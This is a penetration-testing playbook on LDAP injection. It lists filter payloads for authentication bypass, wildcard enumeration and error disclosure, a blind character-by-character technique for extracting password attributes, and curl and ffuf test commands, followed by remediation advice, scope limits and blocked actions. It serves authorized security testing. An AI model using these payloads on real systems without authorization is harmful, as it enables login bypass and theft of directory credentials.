# LDAP Injection — Playbook

## Vulnerability Description

**OWASP:** A03:2021 — Injection
**CWE:** CWE-90 (Improper Neutralization of Special Elements used in an LDAP Query)

LDAP injection occurs when an application builds an LDAP filter by concatenating
untrusted user input without sanitization. An attacker can alter the LDAP query to
retrieve unauthorized directory objects, bypass authentication, or extract sensitive
entries. It is most common against login, user-search, and profile-lookup endpoints
that back onto an LDAP/Samba directory (e.g. an `(objectClass=person)(uid=<user>)`
style filter).

---

## Types

| Type | Description | Detection Method |
|---|---|---|
| **Auth bypass** | Craft filter that always evaluates true | `(uid=*)(|(uid=*))` in a login/password field |
| **Boolean/AND OR blind** | Manipulate `&` / `\|` operators and observe differing results | `(uid=a)(|(password=a))` vs baseline |
| **Wildcard enumeration** | Use `*` / `&` / `|` to make the filter return multiple entries | `(uid=*)` → many results returned |
| **Error-based** | Broken syntax surfaces a detailed LDAP error (server info, hierarchy) | `(uid=a'` → error with filter/LDAP metadata |

---

## Detection

### Blind vs reflected
- **Reflected:** the raw LDAP filter (or its results) appears in the response — e.g. a
  `ldapProfileLink` field echoes the constructed query.
- **Blind:** you only see a change in whether entries match, or a success/failure
  difference, or an error page.

### Manual Payloads

```bash
# Auth bypass — always-true filter (inject into the user/uid field)
# Query becomes: (&(uid=<input>)(userPassword=...))
user = *)(uid=*))(|(uid=*         # closes (uid=, opens an OR that always matches
user = admin)(!(&(1=0             # admin + a negated always-false clause
pass = q)                         # closes the trailing (userPassword=

# Wildcard to dump all entries (enumeration)
(uid=*)
(objectClass=*)
(cn=*)

# Trigger an error to reveal LDAP internals (server, base DN, hierarchy)
(uid=a'
(uid=a)))(|(uid=*
```

### Blind Extraction (character-by-character)

When no data is reflected, interpolate output via filter match/mismatch — the same
technique as blind SQLi:

```bash
# Guess a field value prefix; ASCII * is a wildcard
(&(sn=administrator)(password=A*))   # if TRUE -> first char is A
(&(sn=administrator)(password=B*))   # if FALSE -> try next
# Continue one character at a time: MY, MYK, MYKE ...
```

Default attribute names to probe in `(attr=X*)` form — `*)(ATTRIBUTE=*`:
`userPassword`, `surname`, `name`, `cn`, `sn`, `objectClass`, `mail`,
`givenName`, `commonName`.

For OCTET-string fields (`userPassword`), LDAP compares byte-wise via the
`octetStringOrderingMatch` (OID 2.5.13.18) rule:
```bash
userPassword:2.5.13.18:=\\xx           # \xx is a single byte
userPassword:2.5.13.18:=\\xx\\xx\\xx
```

### Testing Locations
- Login / password fields that back onto a directory service
- User profile lookup by email / username / employee id
- Search endpoints (`?query=...`, `?uid=...`, `?memberof=...`)
- "Forgot password" / account-recovery username fields
- Any endpoint whose response echoes an LDAP filter or LDAP-derived attribute

#### URL-encoded note
In URLs, encode parentheses and braces: `(` → `%28`, `)` → `%29`, `*` → `%2A`, `&` → `%26`, `|` → `%7C`.
Classic wildcard dump:
```bash
curl -G --data-urlencode 'query=(&(objectClass=person)(objectClass=user)(email=*))' \
  'https://target.com/api/users/ldap'
```

---

## Tools

| Tool | Purpose | Notes |
|---|---|---|
| **curl** | Primary manual injection | `curl -G --data-urlencode 'uid=*)' ...` |
| **ldapsearch** | Validate against a directly-reachable LDAP/Samba server | out-of-scope if target is remote; push through the app instead |
| **Burp Repeater/Intruder** | Iterate filter payloads, compare responses | via the in-scope HTTP proxy |
| **ffuf** | Fuzz the search parameter with payload wordlists | `ffuf -w ldap_bypass.txt -u 'https://target/api?query=FUZZ'` |

---

## Internet Research

- `<auth service> ldap injection`
- `<product> ldap filter bypass CVE`
- `site:portswigger.net LDAP injection`
- `ldap injection cheat sheet`
- `<product> objectClass filter error`

---

## Safe Proof of Concept

Non-destructive payloads that prove LDAP filter injection:

```bash
# Wildcard enumeration — reading entries the app already can show, no writes
(uid=*)

# Boolean proof — compare results for a known-existing vs known-missing uid
(uid=knownuser)         # expected: match
(uid=definitelymissing)  # expected: no match
(uid=*)                  # if this returns MORE than the known user, input reaches the filter

# Auth-bypass proof — demonstrate filter alteration with a throwaway account only
# (do NOT use a real admin credential path to gain unintended access)
```

Proof-of-concept rules:
- Never modify, create, or delete directory objects.
- Never use an injection result to access data beyond the application's own scope.
- Prefer a read-only wildcard/enumeration proof over an auth bypass.
- For auth bypass, use a test account you are authorized to control, and verify the
  filter change, not privilege escalation.

---

## Evidence

Each finding should include:

```
Vulnerability: LDAP Injection (filter manipulation)
URL: https://target.com/api/users/ldap
Parameter: query
Payload: (&(objectClass=person)(objectClass=user)(email=*))
Type: Wildcard enumeration

HTTP Request:
  GET /api/users/ldap?query=%28%26%28objectClass%3Dperson%29...%29 HTTP/1.1
  Host: target.com

Response (baseline, one uid): <...single matching entry...>
Response (payload, uid=*):    <...multiple directory entries...>

Proof: the injected wildcard changed the set of returned directory entries,
demonstrating the parameter is concatenated into the LDAP filter.
Remediation: parameterize LDAP filters using a safe API that separates the
search base, scope, and attributes from user-supplied values.
```

---

## Evidence to Save

- Tool output → `$ENG_DIR/evidence/exploitation/ldap-injection/<finding>.*`
- Request/response pairs → `$ENG_DIR/evidence/exploitation/http/`
- Screenshots (if applicable) → `$ENG_DIR/evidence/exploitation/screenshots/`

---

## Remediation

| Measure | Description |
|---|---|
| **Escape all LDAP metacharacters** | Sanitize `( ) * & \| \ ` before inserting into a filter |
| **Use parameterized/checked bind APIs** | Prefer a directory client that accepts filter fragments as data |
| **Separate base DN from user input** | Never let input alter the search base or scope; treat input as a value only |
| **Least-privilege bind account** | The app's directory bind should have read-only access to the minimum OU |
| **Rate-limit and audit search endpoints** | Limit blind-enumeration throughput and log anomalous filters |
| **Return generic errors** | Never surface the raw LDAP filter, server information, or base DN in errors |

---

## Stop Conditions

- Filter returns sensitive directory data beyond engagement scope → pause and record, do not exfiltrate.
- LDAP server reachable directly (bypassing the app) → stop; that is out-of-scope.

## Blocked Actions

| Action | Risk |
|---|---|
| **Creating/modifying/deleting directory objects** | Data integrity violation |
| **Disabling/resetting accounts** | Availability impact |
| **Directly querying an LDAP server outside the app** | Scope violation |
| **Using injected credentials to access unrelated systems** | Lateral movement |
| **Extracting credentials or hashed secrets from the directory** | Data exfiltration |